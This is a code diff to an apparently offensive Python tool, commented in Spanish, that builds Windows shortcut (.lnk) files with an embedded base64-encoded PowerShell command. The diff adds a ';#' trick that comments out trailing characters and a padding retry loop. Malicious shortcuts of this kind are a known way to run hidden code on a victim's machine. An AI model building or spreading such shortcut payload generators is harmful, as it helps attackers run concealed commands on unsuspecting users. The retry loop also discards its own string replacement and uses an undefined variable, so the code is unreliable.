@@ -296,6 +296,12 @@ def check_len_or_save(commands_code, check_ = True):
 
     # Se le agregan las comillas dobles para que internamente el lnk valide -Command " buffer_ "
     total_commands = f' " {commands_code} " '
+
+    # Si queremos obtener la cadena en base64, para evitar errores de ejecucion de codigo no aceptado en powershell
+    # Reemplazamos el final de la cadena por un "#" para asi comentar el resto de comandos o caracteres corruptos
+    if not check_:
+        total_commands = total_commands.replace('; " ', ';#" ')
+
     var_return = base64.b64encode(total_commands.encode("UTF-16BE")).decode()
 
     if check_:
@@ -355,42 +361,52 @@ try:
     # en base64 de la variable code_, la cual contiene el codigo embebido a ejecutar
     with open("modular_lnk.b64", "r", encoding="utf-8") as read_ps_b64, open(name_file_save, "wb") as save_bytes_lnk:
 
+        file_lines = read_ps_b64.readlines()[line_]
+
         # Aqui se obtiene el valor del diccionario, es decir que ocuparan por ejemplo: 0 para normal y 1 para ps minimizado
-        all_b64 = read_ps_b64.readlines()[line_].replace(b64_extra_bytes, code_).replace("=", "").strip()
+        all_b64 = file_lines.replace(b64_extra_bytes, code_).replace("=", "").strip()
 
         # Si el resto de la division de la cantidad total de caracteres del archivo 
         # tiene un resto, se debe de igualar la cadena con "=" dependiendo del caso
-        try:
+        for i in range(10):
+
             rest_ = len(all_b64) % 4
-            print(f"""
-        ---------------------
------------INFORME-DE-CONVERSION-----------
-        ---------------------
-:: Tamaño en txt original: {len(all_b64)}
-:: Resto original: {rest_}
--------------------------------------------""")
+
             if rest_ == 2:
                 all_b64 = all_b64+"=="
 
             if rest_ == 3 or rest_ == 1:
                 all_b64 = all_b64+"="
 
+            # Intentamos decodifciar el base64
             try:
-                # Y se guarda el archivo lnk en binario
-                save_bytes_lnk.write(base64.b64decode(all_b64))
+                base64.b64decode(all_b64)
 
-            except Exception as err:
-                print(f"[ERROR] {err}")
-                exit(0)
+            # Si nos da error, aumentamos el buffer para codificarlo de vuelta a base64 y asi
+            # modificar tambien el padding hasta que coincida correctamente para decodificar
+            except:
+                buffer_ = " " + buffer_
+                code_ = check_len_or_save(buffer_, False)
+                all_b64.replace(b64_extra_bytes, code_).replace("=", "").strip()
+            
+            # Si todo sale bien, se termina
+            else:
+                break
 
-            print(f"""
+        # Y se guarda el archivo lnk en binario
+        save_bytes_lnk.write(base64.b64decode(all_b64))
+
+        print(f"""
+        ---------------------
+-----------INFORME-DE-CONVERSION-----------
+        ---------------------
+:: Tamaño en txt original: {len(all_b64)}
+:: Resto original: {rest_}
+-------------------------------------------
 :: Tamaño en txt ajustado: {len(all_b64)}
 :: Resto resultante: {len(all_b64) % 4}
 -------------------------------------------
 [INFO] LNK guardado como {name_file_save} =>> [OK]""")
-            
-        except Exception as err:
-            print(f"[ERROR] {err}")
 
 except Exception as err:
     print(f"[ERROR] {err}")
